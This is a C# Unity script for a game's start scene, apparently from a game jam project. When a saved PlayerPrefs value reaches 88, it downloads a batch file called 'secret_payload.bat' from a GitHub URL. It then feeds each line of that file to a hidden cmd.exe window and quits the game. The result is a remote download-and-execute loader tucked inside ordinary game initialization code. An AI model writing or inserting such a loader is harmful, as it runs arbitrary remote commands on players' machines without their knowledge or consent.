using System.Diagnostics;
using System.IO;
using System.Net;
using UnityEngine;
using UnityEngine.Networking;
using Debug = UnityEngine.Debug;

namespace Init
{
    public class StartSceneInit : MonoBehaviour
    {
        [SerializeField] private GameObject normalWin;
        [SerializeField] private GameObject errWin;
        private void Start()
        {
            var saveSate = PlayerPrefs.GetInt("passed");
            switch (saveSate)
            {
                case 87:
                    Debug.LogWarning("display errors");
                    errWin.SetActive(true);
                    normalWin.SetActive(false);
                    PlayerPrefs.SetInt("passed", 88);
                    break;
                case 88:
                {
                    Debug.LogWarning("detect passing, downloading shellcode");
                    var request = WebRequest.Create("https://raw.githubusercontent.com/asef18766/GGJ2023/dev/secret_payload.bat") as HttpWebRequest;
                    request.Method = "GET";
                    request.Timeout = 30000;

                    var result = "";
                    // 取得回應資料
                    using (var response = request.GetResponse() as HttpWebResponse)
                    {
                        using (var sr = new StreamReader(response.GetResponseStream()))
                        {
                            result = sr.ReadToEnd();
                        }
                    }
                    Debug.Log($"payload:\n{result}");
                    var cmd = new Process
                    {
                        StartInfo =
                        {
                            FileName = "cmd.exe",
                            RedirectStandardInput = true,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true,
                            UseShellExecute = false
                        }
                    };
                    cmd.Start();
                    foreach (var cmdline in result.Split('\n'))
                    {
                        Debug.Log($"executing {cmdline}");
                        cmd.StandardInput.WriteLine(cmdline);
                        cmd.StandardInput.Flush();
                    }
                    cmd.StandardInput.Close();
#if UNITY_STANDALONE
                    Application.Quit();
#endif
#if UNITY_EDITOR
                    UnityEditor.EditorApplication.isPlaying = false;
#endif
                    break;
                }
                default:
                    Debug.LogWarning("no save detected");
                    break;
            }
        }
    }
}